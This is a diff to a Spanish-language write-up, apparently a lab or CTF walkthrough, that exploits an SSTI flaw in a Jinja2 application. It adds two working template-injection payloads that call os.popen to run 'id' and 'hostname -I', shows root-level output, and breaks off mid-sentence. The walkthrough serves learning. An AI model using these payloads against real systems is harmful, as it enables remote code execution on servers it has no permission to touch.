@@ -124,6 +124,17 @@ Nos muestra 48 esto quiere decir que es vulnerable a SSTI
 
 ### SSTI (Server Side Template Injection )
 
-Navegamos a `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection`
+Navegamos a `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2`
 
 Y hay encontraremos payloads que nos ayuden con la explotación de este campo
+`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
+
+Con este payload obtendremos el resultado del comando `id` la respuesta es
+`uid=0(root) gid=0(root) groups=0(root)`
+
+Eso quiere decir que somos root y podemos ejecutar comandos en la maquina victima
+
+Usaremos 
+`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('hostname -I').read() }}`
+
+Y nos muestra un IP que n
